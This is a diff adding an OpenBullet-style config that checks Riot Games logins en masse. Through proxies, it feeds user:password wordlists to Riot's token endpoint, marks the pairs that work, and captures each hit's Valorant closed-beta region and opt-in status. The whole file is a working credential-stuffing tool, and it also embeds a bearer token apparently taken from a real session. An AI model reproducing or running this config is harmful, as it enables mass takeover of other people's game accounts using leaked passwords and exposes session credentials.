@@ -1,0 +1,112 @@
+[SETTINGS]
+{
+  "Name": "Valorant Beta OPTIN",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-14T07:58:37.7092637+08:00",
+  "AdditionalInfo": "",
+  "Author": "Cptlawlzy",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://auth.riotgames.com/token" 
+  CONTENT "client_assertion_type=urn%3Aietf%3Aparams%3Aoauth%3Aclient-assertion-type%3Ajwt-bearer&client_assertion=eyJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczpcL1wvYXV0aC5yaW90Z2FtZXMuY29tXC90b2tlbiIsInN1YiI6ImxvbCIsImlzcyI6ImxvbCIsImV4cCI6MTYwMTE1MTIxNCwiaWF0IjoxNTM4MDc5MjE0LCJqdGkiOiIwYzY3OThmNi05YTgyLTQwY2ItOWViOC1lZTY5NjJhOGUyZDcifQ.dfPcFQr4VTZpv8yl1IDKWZz06yy049ANaLt-AKoQ53GpJrdITU3iEUcdfibAh1qFEpvVqWFaUAKbVIxQotT1QvYBgo_bohJkAPJnZa5v0-vHaXysyOHqB9dXrL6CKdn_QtoxjH2k58ZgxGeW6Xsd0kljjDiD4Z0CRR_FW8OVdFoUYh31SX0HidOs1BLBOp6GnJTWh--dcptgJ1ixUBjoXWC1cgEWYfV00-DNsTwer0UI4YN2TDmmSifAtWou3lMbqmiQIsIHaRuDlcZbNEv_b6XuzUhi_lRzYCwE4IKSR-AwX_8mLNBLTVb8QzIJCPR-MGaPL8hKPdprgjxT0m96gw&grant_type=password&username=NA1|<USER>&password=<PASS>&scope=openid offline_access lol ban profile email phone" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: application/json" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+
+#Token PARSE "<SOURCE>" LR "access_token\":\"" "\",\"" -> VAR "Token" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Failure OR 
+    KEY "invalid_credentials" 
+
+#UserInfo REQUEST GET " https://us-west-2.optin.i.rpg.pvp.net/api/v1/optins/urn:entitlement:valorantriot.valorant.closedbeta" 
+  
+  HEADER "Accept: */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Authorization: Bearer <Token>" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Host: us-west-2.optin.i.rpg.pvp.net" 
+  HEADER "Origin: https://beta.playvalorant.com" 
+  HEADER "Referer: https://beta.playvalorant.com/en-us/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
+
+PARSE "<SOURCE>" JSON "locale" CreateEmpty=FALSE -> CAP "Region" 
+
+PARSE "<SOURCE>" JSON "status" CreateEmpty=FALSE -> CAP "Status" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<SOURCE>" DoesNotContain "\"status\":\"OPTED_IN\"" 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "404" 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"OPTED_IN\"" 
+    KEY "\"status\":\"" 
+
+REQUEST POST "https://auth.riotgames.com/userinfo" 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 0" 
+  HEADER "origin: https://beta.playvalorant.com" 
+  HEADER "referer: https://beta.playvalorant.com/en-us/" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
+  HEADER "authorization: Bearer eyJraWQiOiJzMSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiI3YjM0YjM4YS1lYTVhLTUxYjYtYmNkNy1iMTIwNjQ2OWUxMjEiLCJzY3AiOlsiYWNjb3VudCIsIm9wZW5pZCJdLCJjbG0iOlsib3BlbmlkIiwicHciLCJhY2N0X2dudCIsImFjY3QiLCIhRkFBQyJdLCJkYXQiOnsicCI6IiIsImMiOiJ1ZTEifSwiaXNzIjoiaHR0cHM6XC9cL2F1dGgucmlvdGdhbWVzLmNvbSIsImV4cCI6MTU4Njc2NTg1MCwiaWF0IjoxNTg2NzYyMjUwLCJqdGkiOiI5WE1jaTZIVVlXRSIsImNpZCI6InBsYXktdmFsb3JhbnQtd2ViLXByb2QifQ.kHjQbAg2UagXJmhd9-xpCIfdI272bWkq5rZY30n6qgJsTxfBxuRM4vxU-4hfjcm8wVCC9Gj3voBdUualJ2SxCLmQszDcqtSyPoYo7Yyx3t3QCC5wLCSpmGzlCt9CvAHjBtgXegQSog0DynoqbQTbVZ4zqB6CWulT9aSITqdXxtc" 
+
